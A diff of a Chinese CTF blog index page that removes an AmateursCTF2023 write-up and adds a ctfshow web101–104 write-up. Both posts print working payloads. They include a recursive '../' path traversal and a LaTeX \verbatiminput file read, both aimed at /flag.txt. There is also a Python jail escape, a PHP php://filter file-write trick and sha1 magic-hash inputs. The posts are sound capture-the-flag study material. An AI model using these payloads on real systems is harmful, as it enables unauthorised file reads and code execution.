@@ -185,141 +185,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2023/07/19/AmateursCTF2023/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="lvzhouhang">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="lvzhouhang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/07/19/AmateursCTF2023/" class="post-title-link" itemprop="url">AmateursCTF2023</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-07-19 16:52:42" itemprop="dateCreated datePublished" datetime="2023-07-19T16:52:42+08:00">2023-07-19</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-07-20 22:07:56" itemprop="dateModified" datetime="2023-07-20T22:07:56+08:00">2023-07-20</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>7.1k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>6 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="waiting-an-eternity"><a href="#waiting-an-eternity" class="headerlink" title="waiting-an-eternity"></a>waiting-an-eternity</h2><p><img src="/pic/AmateursCTF/web1.png"></p>
-<p>看文件头，要等好长事件之后才会刷新,直接访问后面的url</p>
-<p><img src="/pic/AmateursCTF/web2.png"></p>
-<p>secretcode是md5解密，但是没什么用，Cookie里有<code>time</code>是时间戳将他改成<code>NAN</code>显示flag</p>
-<p><img src="/pic/AmateursCTF/web3.png"></p>
-<h2 id="funny-factorials"><a href="#funny-factorials" class="headerlink" title="funny factorials"></a>funny factorials</h2><p>附件给了一个app.py</p>
-<p>可控点在这里，通过改变主题得到flag</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def filter_path(path):</span><br><span class="line">    # print(path)</span><br><span class="line">    path = path.replace(&quot;../&quot;, &quot;&quot;)</span><br><span class="line">    try:</span><br><span class="line">        return filter_path(path)</span><br><span class="line">    except RecursionError:</span><br><span class="line">        # remove root / from path if it exists</span><br><span class="line">        if path[0] == &quot;/&quot;:</span><br><span class="line">            path = path[1:]</span><br><span class="line">        print(path)</span><br><span class="line">        return path</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>将path里面的<code>../</code>删掉了，如果path开头是<code>/</code>会忽视掉，但是如果递归超过1000次就会进入<code>RecursionError</code>然后访问根目录下的flag.txt就行</p>
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /?theme=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../..///flag.txt</span><br></pre></td></tr></table></figure>
-
-<h2 id="latek"><a href="#latek" class="headerlink" title="latek"></a>latek</h2><p>关于latek可以看看这篇文章<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/security-management/308191.html">https://www.freebuf.com/articles/security-management/308191.html</a></p>
-<p><img src="/pic/AmateursCTF/web4.png"></p>
-<p>直接用\input的话flag输出不完全，问了chatgpt可以用其他方法进行任意文件读取</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\documentclass&#123;article&#125;</span><br><span class="line">\usepackage&#123;verbatim&#125;</span><br><span class="line">\begin&#123;document&#125;</span><br><span class="line">Hello, world!</span><br><span class="line">\verbatiminput&#123;/flag.txt&#125;</span><br><span class="line">\end&#123;document&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="REV"><a href="#REV" class="headerlink" title="REV"></a>REV</h1><h2 id="volcano"><a href="#volcano" class="headerlink" title="volcano"></a>volcano</h2><p>ida分析，先看main函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+8h] [rbp-C8h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+10h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+18h] [rbp-B8h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+20h] [rbp-B0h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+28h] [rbp-A8h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">136</span>]; <span class="comment">// [rsp+30h] [rbp-A0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+B8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me a bear: &quot;</span>);</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%llu&quot;</span>, &amp;v7);</span><br><span class="line">  <span class="keyword">if</span> ( !sub_12BB(v7) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;That doesn&#x27;t look like a bear!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Give me a volcano: &quot;</span>);</span><br><span class="line">    v8 = <span class="number">0LL</span>;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%llu&quot;</span>, &amp;v8);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)sub_13D9(v8) != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;That doesn&#x27;t look like a volcano!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Prove to me they are the same: &quot;</span>);</span><br><span class="line">      v9 = <span class="number">0LL</span>;</span><br><span class="line">      v10 = <span class="number">4919LL</span>;</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%llu&quot;</span>, &amp;v9);</span><br><span class="line">      <span class="keyword">if</span> ( (v9 &amp; <span class="number">1</span>) != <span class="number">0</span> &amp;&amp; v9 != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = sub_1209(v8);</span><br><span class="line">        <span class="keyword">if</span> ( v4 == sub_1209(v7)</span><br><span class="line">          &amp;&amp; (v5 = sub_124D(v8), v5 == sub_124D(v7))</span><br><span class="line">          &amp;&amp; (v6 = sub_1430(v10, v8, v9), v6 == sub_1430(v10, v7, v9)) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;That looks right to me!&quot;</span>);</span><br><span class="line">          stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">          fgets(s, <span class="number">128</span>, stream);</span><br><span class="line">          <span class="built_in">puts</span>(s);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Nope that&#x27;s not right!&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s not a valid proof!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>先看<code>sub_12BB</code>和<code>sub_13D9</code>这两个</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">sub_12BB</span><span class="params">(<span class="type">unsigned</span> __int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (a1 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 % <span class="number">3</span> != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 % <span class="number">5</span> != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 % <span class="number">7</span> == <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> a1 % <span class="number">109</span> == <span class="number">55</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall sub_13D9(unsigned __int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v2 = 0LL;</span><br><span class="line">  while ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 += a1 &amp; 1;</span><br><span class="line">    a1 &gt;&gt;= 1;</span><br><span class="line">  &#125;</span><br><span class="line">  return v2 &gt; 16 &amp;&amp; v2 &lt;= 26;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>逻辑很简单，写脚本爆破一下就行</p>
-<p>看后面</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ( v4 == sub_1209(v7)</span><br><span class="line">         &amp;&amp; (v5 = sub_124D(v8), v5 == sub_124D(v7))</span><br><span class="line">         &amp;&amp; (v6 = sub_1430(v10, v8, v9), v6 == sub_1430(v10, v7, v9)) )</span><br></pre></td></tr></table></figure>
-
-<p>前几个完全没用只用考虑最后一个括号里的内容就行。</p>
-<p>sub_1430:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_1430</span><span class="params">(<span class="type">unsigned</span> __int64 a1, <span class="type">unsigned</span> __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+20h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">1LL</span>;</span><br><span class="line">  v5 = a1 % a3;</span><br><span class="line">  <span class="keyword">while</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (a2 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      v6 = v5 * v6 % a3;</span><br><span class="line">    a2 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    v5 = v5 * v5 % a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>直接写脚本爆破就行了</p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check1</span>(<span class="params">a1</span>):</span><br><span class="line">    <span class="keyword">if</span> a1 &amp; <span class="number">1</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> a1 % <span class="number">3</span> != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> a1 % <span class="number">5</span> != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> a1 % <span class="number">7</span> == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> a1 % <span class="number">109</span> == <span class="number">55</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check2</span>(<span class="params">a1</span>):</span><br><span class="line">    v2 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> a1:</span><br><span class="line">        v2 += a1 &amp; <span class="number">1</span></span><br><span class="line">        a1 &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">16</span> &lt; v2 &lt;= <span class="number">26</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000000</span>):</span><br><span class="line">        <span class="keyword">if</span> check1(i) <span class="keyword">and</span> check2(i):</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>():</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">if</span> ((i &amp; <span class="number">1</span>) != <span class="number">0</span> <span class="keyword">and</span> (i!= <span class="number">1</span>)):</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">s() <span class="comment">#输出前两个数</span></span><br><span class="line">a() <span class="comment">#输出第三个数</span></span><br></pre></td></tr></table></figure>
-
-<p>bear和volcano的数值一样。</p>
-<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h1 id="Censorship"><a href="#Censorship" class="headerlink" title="Censorship"></a>Censorship</h1><p>给了一个main.py</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> [flag]:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            code = <span class="built_in">ascii</span>(<span class="built_in">input</span>(<span class="string">&quot;Give code: &quot;</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> code <span class="keyword">or</span> <span class="string">&quot;e&quot;</span> <span class="keyword">in</span> code <span class="keyword">or</span> <span class="string">&quot;t&quot;</span> <span class="keyword">in</span> code <span class="keyword">or</span> <span class="string">&quot;\\&quot;</span> <span class="keyword">in</span> code:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;invalid input&quot;</span>)</span><br><span class="line">            <span class="built_in">exec</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">            <span class="built_in">print</span>(err)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>可以执行python的命令,但是不能有<code>flag</code>,<code>e</code>,<code>t</code>，flag是被定义的但是print里有t没有办法回显，可以用python的内置函数获得print。</p>
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vars(globals()[dir()[2]])[globals()[dir()[2]].__dir__()[42]](globals())</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2023/07/11/CrewCTF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1429,6 +1294,108 @@
   
   
 
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2023/02/18/ctfshow-web%E5%85%A5%E9%97%A8101~104/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lvzhouhang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lvzhouhang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/02/18/ctfshow-web%E5%85%A5%E9%97%A8101~104/" class="post-title-link" itemprop="url">ctfshow web入门101~104</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-02-18 19:30:48 / 修改时间：23:26:09" itemprop="dateCreated datePublished" datetime="2023-02-18T19:30:48+08:00">2023-02-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctfshow/%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">刷题</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctfshow/%E5%88%B7%E9%A2%98/php%E7%89%B9%E6%80%A7/" itemprop="url" rel="index"><span itemprop="name">php特性</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>793</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h1><p><img src="/pic/101.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当新建ReflectionClass类并传入PHP代码时，会返回代码的运行结果，可以通过echo显示</span><br><span class="line">即使传入了空的括号，代码依旧可以运行，且error_reporting(0)的存在阻止了报错</span><br></pre></td></tr></table></figure>
+<p>v1必须是数字，v2可以使用可以使用反射类new ReflectionClass(),v3没有过滤<code>;</code>。<br>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v2=echo new Reflectionclass&amp;v3=;</span><br></pre></td></tr></table></figure>
+<p>0x2d还是-，然后最后一位需要自己猜。</p>
+<h1 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h1><p><img src="/pic/102.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">is_numeric() 函数用于检测变量是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回true，否则返回false。如果字符串中含有一个e代表科学计数法，也可返回true</span><br><span class="line"></span><br><span class="line">call_user_func() 函数用于调用方法或者变量，第一个参数是被调用的函数，第二个是调用的函数的参数</span><br><span class="line"></span><br><span class="line">file_put_contents() 函数应该都熟悉了，写入内容到文件中，第一个参数是文件名，第二个参数是内容</span><br></pre></td></tr></table></figure>
+<p>要确保v4为真，就要确保v2是数字.将v2进行base64编码然后再转换成16进制。<br>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=2.php</span><br><span class="line">POST：v1=hex2bin</span><br></pre></td></tr></table></figure>
+<p>然后访问2.php查看源码就能找到flag。</p>
+<h1 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h1><p>找不到服务器，做不了题.</p>
+<h1 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h1><p><img src="/pic/104.png"><br>因为没有判断，可以直接让两个值相等，也可以用数组绕过，也可以用两个相等的sha1的值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aaK1STfY</span><br><span class="line">0e76658526655756207688271159624026011393</span><br><span class="line">aaO8zKZF</span><br><span class="line">0e89257456677279068558073954252716165668</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
 
   
   <nav class="pagination">
@@ -1498,7 +1465,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">53</span>
+          <span class="site-state-item-count">52</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
